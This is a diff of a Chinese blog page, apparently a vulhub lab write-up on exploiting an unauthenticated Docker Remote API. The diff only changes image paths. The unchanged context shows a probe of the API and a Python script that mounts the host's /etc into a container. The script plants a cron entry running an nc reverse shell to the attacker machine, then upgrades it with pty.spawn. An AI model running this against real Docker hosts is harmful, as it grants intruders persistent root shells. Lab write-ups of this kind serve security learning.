@@ -374,10 +374,10 @@
         
         <div class="entry-content">
           <p>BEN机搭建了一个环境：</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20211028142832775.png" alt="image-20211028142832775"></p>
+<p><img src="/2021/10/28/Docker-Api未授权访问/image-20211028142832775.png" alt="image-20211028142832775"></p>
 <p>验证是否存在：</p>
 <pre><code>docker -H tcp://192.168.43.145 ps -a</code></pre><p>如果存在就会看到目标的docker容器列表：</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20211028150701168.png" alt="image-20211028150701168"></p>
+<p><img src="/2021/10/28/Docker-Api未授权访问/image-20211028150701168.png" alt="image-20211028150701168"></p>
 <p>哎呀。这个vulhub的下面没有。</p>
 <p>远程查看存在的镜像：</p>
 <pre><code>docker -H tcp://192.168.43.145 images</code></pre><p>下面这儿可以省略，没有写，写.ssh思路。直接跳转到利用shell脚本即可：</p>
@@ -389,7 +389,7 @@ client = docker.DockerClient(base_url=&#39;http://192.168.43.145:2375/&#39;)
 data = client.containers.run(&#39;alpine:latest&#39;, r&#39;&#39;&#39;sh -c &quot;echo &#39;*/1 * * * * /usr/bin/nc 192.168.43.133 8888 -e /bin/sh&#39; &gt;&gt; /tmp/etc/crontabs/root&quot; &#39;&#39;&#39;, remove=True, volumes={&#39;/etc&#39;: {&#39;bind&#39;: &#39;/tmp/etc&#39;, &#39;mode&#39;: &#39;rw&#39;}})</code></pre>
 <p>在kali上直接执行脚本，等一段时间shell就回来了：</p>
 <p>这儿原理(其实就是解释python脚本编写思路：Docker随意启动一个容器(这里是远程连接让目标机器启动，不是自己本地启动容器)，并将宿主机的 /etc 目录挂载到容器中，便可以任意读写文件了。可以将命令写入 crontab 配置文件，进行反弹shell。)</p>
-<p><img src="C:/Users/xiongfeng/AppData/Roaming/Typora/typora-user-images/image-20211028152721508.png" alt="image-20211028152721508"></p>
+<p><img src="/2021/10/28/Docker-Api未授权访问/image-20211028152721508.png" alt="image-20211028152721508"></p>
 <p>nc反弹回来变成交互shell:</p>
 <pre><code class="python">python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre>
 
